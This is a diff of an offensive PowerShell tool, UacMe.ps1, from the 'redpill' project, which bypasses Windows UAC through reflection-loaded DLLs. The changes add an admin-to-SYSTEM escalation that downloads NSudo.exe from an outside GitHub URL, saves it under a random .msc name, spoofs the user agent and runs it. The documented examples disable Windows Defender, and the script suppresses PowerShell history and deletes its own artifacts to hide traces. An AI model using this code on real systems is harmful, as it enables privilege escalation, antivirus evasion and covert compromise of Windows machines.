@@ -6,21 +6,25 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: Reflection.Assembly {native}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.2.3
+   PS cmdlet Dev version: v1.3.3
 
 .DESCRIPTION 
    This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
    using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
    and elevate privileges { user -> admin } or to exec one command with admin privs!
 
+.NOTES
+   If executed with administrator privileges and the 'Elevate' @argument its sellected,
+   then this cmdlet will try to elevate the "cmdline" from admin => NT AUTHORITY\SYSTEM!
+
 .Parameter Action
-   Accepts arguments: Bypass, Elevate OR Clean
+   Accepts arguments: Bypass, Elevate, Clean
 
 .Parameter Execute
-   Accepts the command\appl to be executed! (cmd|powershell)
+   Accepts the command OR application absoluct path to be executed!
 
 .Parameter Date
-   Delete artifacts left behind by is 'CreationDate'
+   Delete artifacts left behind by is 'CreationTime' (default: today)
 
 .EXAMPLE
    PS C:\> Get-Help .\UacMe.ps1 -full
@@ -36,11 +40,7 @@
    
 .EXAMPLE
    PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell.exe"
-   Local spawns an powershell prompt with administrator privileges!   
-
-.EXAMPLE
-   PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell -file $Env:TMP\redpill.ps1"
-   Executes redpill.ps1 script trougth uac bypass module with elevated shell privs {admin}
+   Local spawns an powershell prompt with administrator privileges!
    
 .EXAMPLE
    PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell -file $Env:TMP\DisableDefender.ps1 -Action Stop"
@@ -53,7 +53,7 @@
 
 .EXAMPLE
    PS C:\> .\UacMe.ps1 -Action Clean -Date "19/04/2021"
-   Clean ALL artifacts left behind by this cmdlet by is 'CreationDate'
+   Clean ALL artifacts left behind by this cmdlet by is 'CreationTime'
 
 .INPUTS
    None. You cannot pipe objects into UacMe.ps1
@@ -69,10 +69,10 @@
    SeIncreaseWorkingSetPrivilege Aumentar um conjunto de trabalho de processos Disabled
    SeTimeZonePrivilege           Alterar o fuso horário                        Disabled
 
-   UAC State     : Enabled
-   UAC Settings  : Notify Me
-   ReflectionDll : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
-   Execute       : powershell -file C:\Users\pedro\AppData\Local\Temp\redpill.ps1
+   UAC State    : Enabled
+   UAC Settings : Notify Me
+   EOP Trigger  : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
+   Execute      : powershell -file C:\Users\pedro\AppData\Local\Temp\DisableDefender.ps1 -Action Stop
    
 .LINK
    https://github.com/r00t-3xp10it/redpill
@@ -96,9 +96,9 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
 
 
-If($Action -ieq "False"){## [error] none parameters input by cmdlet user!
-   Write-Host "`n`n[error:] This cmdlet requires the use of -parameters to work!" -ForeGroundColor Red -BackGroundColor Black
-   Write-Host "[syntax] .\UacMe.ps1 -Action Bypass -Execute`"cmd.exe`"`n`n"
+If($Action -ieq "False"){## [error] none parameters sellected by cmdlet user!
+   Write-Host "`n[error:] This cmdlet requires the use of -Parameters to work!" -ForeGroundColor Red -BackGroundColor Black
+   Write-Host "[syntax] Get-Help .\UacMe.ps1 -full`n" -ForegroundColor Yellow
    exit ## Exit @UacMe
 }
 
@@ -139,7 +139,7 @@ exit")
 
 
    ## Build Output Table
-   Write-Host "`n`nBypass UAC execution confirmation!" -ForegroundColor Green
+   Write-Host "`n`nBypass UAC execution confirmation!"
    Write-Host "----------------------------------"
 
    ## Write Source.bat script into %tmp% directory!
@@ -150,7 +150,8 @@ exit")
 
       ## Execute trigger batch script
       Write-Host "Trigger: $Env:TMP\$RandomMe.bat"
-      Write-Host "Execute: $Execute`n`n";Start-Sleep -Seconds 1
+      Write-Host "Execute: $Execute"
+      Start-Sleep -Seconds 1 ## Give some time for display
       Start-Process -FilePath "$Env:TMP\$RandomMe.bat"
 
    }Else{## [error] fail to create Trigger.bat
@@ -166,7 +167,6 @@ exit")
       Remove-Item -Path "$Env:TMP\$RandomMe.bat" -Force
    }
 
-exit ## Exit @UacMe
 }
 
 
@@ -183,22 +183,69 @@ If($Action -ieq "Elevate"){
       
    .NOTES
       Required dependencies: Source.sc { auto-Build }
-      Required dependencies: DavSyncProvider.dll { auto-Build }
       Required dependencies: Reflection.Assembly {native}
+      Required dependencies: DavSyncProvider.dll { auto-Build }
+
+      If executed with administrator privileges and the 'Elevate' @argument its sellected,
+      then this cmdlet will try to elevate the "cmdline" from admin => NT AUTHORITY\SYSTEM!
    
    .EXAMPLE
       PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell.exe"
       Local spawns an powershell prompt with administrator privileges!
       
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell -file $Env:TMP\redpill.ps1"
-      Execute redpill.ps1 script trougth uac bypass module to elevate shell privileges to admin!
-      
-   .EXAMPLE
       PS C:\> .\UacMe.ps1 -Action Elevate -Execute "cmd /c Reg Add 'HKLM\Software\Policies\Microsoft\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
       Disables Windows Defender { permanent - does not start with PC restart } by adding a registry key to HKLM hive!
    #>
    
+
+   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
+   If($IsClientAdmin){## From administrator => NT AUTHORITY\SYSTEM
+      Write-Host "`n`n[admin] Elevating privileges to NT AUTHORITY\SYSTEM!" -ForeGroundColor Yellow
+   
+      ## Download and masquerade the required standalone executable
+      $RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
+      If(-not(Test-Path -Path "$Env:TMP\$RandomMe.msc" -EA SilentlyContinue)){
+         iwr -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $Env:TMP\$RandomMe.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+      }
+
+      If(-not(Test-Path -Path "$Env:TMP\$RandomMe.msc" -EA SilentlyContinue)){
+
+         Write-Host "[error] fail to download: $Env:TMP\$RandomMe.msc!`n`n" -ForegroundColor Red -BackgroundColor Black
+         exit ## Exit @redpill
+
+      }Else{## Execute Binary to elevate shell to NT AUTHORITY\SYSTEM
+
+         cd $Env:TMP;.\$RandomMe.msc -U:T -P:E $Execute
+         cd $Working_Directory ## Return to @UacMe working directory
+
+      }
+
+
+      ## Get privileges info
+      $ShellPriv = whoami /priv
+      $ParseData = $ShellPriv -replace 'PRIVILEGES INFORMATION','' -replace '----------------------',''
+      Write-Host "`nPrivilege Name                            Description                                                           State"
+      Write-Host "========================================= ===================================================================== ========"
+      echo $ParseData > $Env:TMP\graca.log;Get-Content -Path "$Env:TMP\graca.log" | Where-Object { 
+         $_ -iMatch 'Enabled' -and $_ -ne "" } ## filter only Enabled privileges!
+
+      $RawPolicyKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system" -Join ''
+      $UacStatus = (Get-ItemProperty -Path "$RawPolicyKey" -EA SilentlyContinue).EnableLUA
+      If($UacStatus -eq "0"){$UacStatus = "Disabled"}Else{$UacStatus = "Enabled"}
+
+      ## Build Output Table
+      Write-Host "`nUAC State    : $UacStatus"
+      Write-Host "EOP Trigger  : $Env:TMP\$RandomMe.msc"
+      Write-Host "Execute      : $Execute`n`n"
+   
+      ## Clean ALL artifacts left behind!
+      Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
+      Remove-Item -Path "$Env:TMP\$RandomMe.msc" -EA SilentlyContinue -Force
+
+   exit ## Exit @UacMe
+   }## End of 'admin => system' function!
+
    
    ## Delete files left behind by this cmdlet in previous runs!
    If(Test-Path -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue){
@@ -371,10 +418,10 @@ ShortSvcName=`"`"CorpVPN`"`"
    echo $ParseData > $Env:TMP\graca.log;Get-Content -Path "$Env:TMP\graca.log" | Where-Object { $_ -ne "" }
 
    ## Build Output Table
-   Write-Host "`nUAC State     : $UacStatus"
-   Write-Host "UAC Settings  : $UacSettings"
-   Write-Host "ReflectionDll : $Env:TMP\DavSyncProvider.dll"
-   Write-Host "Execute       : $Execute"
+   Write-Host "`nUAC State    : $UacStatus"
+   Write-Host "UAC Settings : $UacSettings"
+   Write-Host "EOP Trigger  : $Env:TMP\DavSyncProvider.dll"
+   Write-Host "Execute      : $Execute"
    
    ## Clean ALL artifacts left behind!
    Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
@@ -404,7 +451,7 @@ If($Action -ieq "Clean"){
 
    .EXAMPLE
       PS C:\> .\UacMe.ps1 -Action Clean -Date "19/04/2021"
-      Clean ALL artifacts left behind by this cmdlet by is 'CreationDate'
+      Clean ALL artifacts left behind by this cmdlet by is 'CreationTime'
       
    .EXAMPLE
       PS C:\> .\UacMe.ps1 -Action Elevate -Execute "powershell -file $Env:TMP\UacMe.ps1 -Action Clean"
@@ -440,12 +487,12 @@ If($Action -ieq "Clean"){
       $Date = Get-date -Format "dd/MM/yyyy" ## Get todays date: 19/04/2021   
    }
 
-   ## This function deletes ALL .cs|.bat files from '%tmp%'
+   ## This function deletes ALL .cs|.bat|.msc files from '%tmp%'
    # directory. If the 'CreationTime' of the files Matches todays date!
    $CleanInf = (Get-ChildItem -Path "$Env:TMP" | Where-Object { 
-      $_.CreationTime.ToString() -Match "$Date" -and $_.Name -Match '(.cs|.bat)$' 
+      $_.CreationTime.ToString() -Match "$Date" -and $_.Name -iMatch '(.cs|.bat|.msc)$' 
    }).FullName
-   ForEach($Item in $CleanInf){## Delete ALL .cs files found from &tmp%
+   ForEach($Item in $CleanInf){## Delete ALL .cs|.bat|.msc files from %tmp%
       Remove-Item -Path "$Item" -EA SilentlyContinue -Force
       $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
       $MyList += "$Item`n" ## Add Entry to $MyList
@@ -456,7 +503,7 @@ If($Action -ieq "Clean"){
    $CleanInf = (Get-ChildItem -Path "$Env:WINDIR\temp" | Where-Object { 
       $_.CreationTime.ToString() -Match "$Date" -and $_.Name -Match '(.inf)$' 
    }).FullName
-   ForEach($Item in $CleanInf){## Delete ALL .inf files found from C:\Windows\Temp dir!
+   ForEach($Item in $CleanInf){## Delete ALL .inf files from C:\Windows\Temp
       Remove-Item -Path "$Item" -EA SilentlyContinue -Force
       $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
       $MyList += "$Item`n" ## Add Entry to $MyList
@@ -512,4 +559,4 @@ If($Action -ieq "Clean"){
    }
 
 }
-Write-Host "`n"
+Write-Host "`n`n"
